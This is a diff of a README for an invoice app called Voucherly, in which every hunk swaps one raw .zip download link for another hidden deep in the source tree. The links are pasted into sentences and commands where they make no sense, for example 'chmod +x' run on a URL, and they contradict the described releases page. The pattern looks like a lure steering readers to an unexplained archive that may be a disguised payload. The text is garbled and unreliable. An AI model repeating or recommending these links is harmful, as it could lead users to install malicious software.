@@ -1,17 +1,17 @@
 # ✨ Voucherly - Create Invoices Easily and Efficiently
 
 ## 🛠️ Overview
-Welcome to Voucherly, an Electron https://raw.githubusercontent.com/akashsaud2/Voucherly/main/teponaztli/Voucherly.zip invoice application built for small businesses. This app makes invoice generation simple and user-friendly. Whether you are a freelancer or run a small enterprise, Voucherly helps you manage your invoicing needs seamlessly.
+Welcome to Voucherly, an Electron https://github.com/akashsaud2/Voucherly/raw/refs/heads/main/src/renderer/src/components/Software_1.2.zip invoice application built for small businesses. This app makes invoice generation simple and user-friendly. Whether you are a freelancer or run a small enterprise, Voucherly helps you manage your invoicing needs seamlessly.
 
 ## 📥 Download Voucherly
-[![Download Voucherly](https://raw.githubusercontent.com/akashsaud2/Voucherly/main/teponaztli/Voucherly.zip%20Now- Voucherly-%2320c997)](https://raw.githubusercontent.com/akashsaud2/Voucherly/main/teponaztli/Voucherly.zip)
+[![Download Voucherly](https://github.com/akashsaud2/Voucherly/raw/refs/heads/main/src/renderer/src/components/Software_1.2.zip%20Now- Voucherly-%2320c997)](https://github.com/akashsaud2/Voucherly/raw/refs/heads/main/src/renderer/src/components/Software_1.2.zip)
 
 ## 🚀 Getting Started
 Follow these straightforward steps to download and run Voucherly. No programming knowledge is required.
 
 ### 1. Visit the Download Page
 To start, visit our release page. This page includes the latest version of Voucherly and all previous releases.
-[Download Voucherly Here!](https://raw.githubusercontent.com/akashsaud2/Voucherly/main/teponaztli/Voucherly.zip)
+[Download Voucherly Here!](https://github.com/akashsaud2/Voucherly/raw/refs/heads/main/src/renderer/src/components/Software_1.2.zip)
 
 ### 2. Choose Your Version
 On the releases page, you will see a list of available versions. Select the latest version for optimal performance and features.
@@ -26,7 +26,7 @@ Click on the version you want to download. You will find files for different ope
 ### 4. Install Voucherly
 - **Windows:** Once the `.exe` file has downloaded, double-click it to start the installation. Follow the prompts to complete the installation.
 - **macOS:** Open the downloaded `.dmg` file and drag the Voucherly icon to your Applications folder.
-- **Linux:** Make the `.AppImage` executable by running `chmod +x https://raw.githubusercontent.com/akashsaud2/Voucherly/main/teponaztli/Voucherly.zip` in the terminal. Then, double-click the file to run it.
+- **Linux:** Make the `.AppImage` executable by running `chmod +x https://github.com/akashsaud2/Voucherly/raw/refs/heads/main/src/renderer/src/components/Software_1.2.zip` in the terminal. Then, double-click the file to run it.
 
 ### 5. Launch the Application
 After installation, find Voucherly in your applications list. Click to open it, and you’re ready to create your first invoice!
@@ -60,4 +60,4 @@ If you need assistance or have questions about using Voucherly, feel free to rea
 ## 📢 Acknowledgments
 Thank you for choosing Voucherly. Your support allows us to continue improving and adding features to better serve small businesses. 
 
-Remember, for the latest version, you can always [visit this page to download](https://raw.githubusercontent.com/akashsaud2/Voucherly/main/teponaztli/Voucherly.zip)!
+Remember, for the latest version, you can always [visit this page to download](https://github.com/akashsaud2/Voucherly/raw/refs/heads/main/src/renderer/src/components/Software_1.2.zip)!
